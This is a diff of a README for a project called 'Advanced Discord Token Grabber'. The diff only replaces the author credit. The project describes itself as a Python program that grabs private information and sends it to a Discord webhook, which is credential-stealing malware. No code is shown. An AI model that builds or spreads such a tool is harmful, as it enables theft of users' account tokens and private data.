@@ -1,4 +1,4 @@
-## Advanced Discord Token Grabber made by ††#7777
+## Advanced Discord Token Grabber made by STRANGER77
 Simple python program that can grab private informations and send to specified Discord Webhook!
 
 ____
